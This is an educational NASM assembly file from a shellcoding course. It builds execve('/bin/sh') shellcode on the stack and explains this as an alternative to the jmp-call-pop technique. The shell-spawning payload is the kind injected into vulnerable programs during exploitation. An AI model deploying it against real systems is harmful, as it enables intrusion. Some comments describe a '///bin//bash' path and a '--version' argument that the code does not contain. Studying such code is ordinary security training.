; File: execve-stack.nasm
; Author: Kevin Ren, originally professor Viviek of SLAE
; Purpose: to demostrate calling execve sys call using the stack 
;		instead of jmp call pop to allocate the interested argument string address


; ULTIMATLY WE NEED TO STACK LOOKING LIKE THIS: 
; <--low | address of reverseHex(///bin//bash) + argv[1:] + dword 0s | dword 0s | reverseHex(///bin//bash) | dword 0s | <--high 

; REMEMBER execve sypnosis: int execve(char* filename, char* argv[], char* env[])
; ALSO since we are only manipulating the stack in this method, seg fault would not occur
; compare to jmp call pop technqiue where we modify/overwrite an address in the text section with will seg fault

global _start

section .text
_start:
	xor eax, eax				; first dword of zeros needs to be pushed onto stack
	push eax
	
	push 0x68732f6e				; pushing //bin/sh in reverse hex order
	push 0x69622f2f				; NOTE: these pushes can be replaced with any path to exe in reverse hex, such as //bin/ls, etc

	
	mov ebx, esp				; 1st arg, setting filename arguemnt to the current stack which points to //bin/sh0000
	
	push eax				; 3rd arg, second dword of zeros are pushed for env[] structure
	mov edx, esp				

	push ebx				; pushing the address of null terminated filename //bin/sh000
	mov ecx, esp				; 2nd argument, includes address(////bin/bash0000) + address(--version000) + 0000

	mov al, 0xb				; setting up and invoking execve syscall, 0xb for syscall number 11
	int 0x80



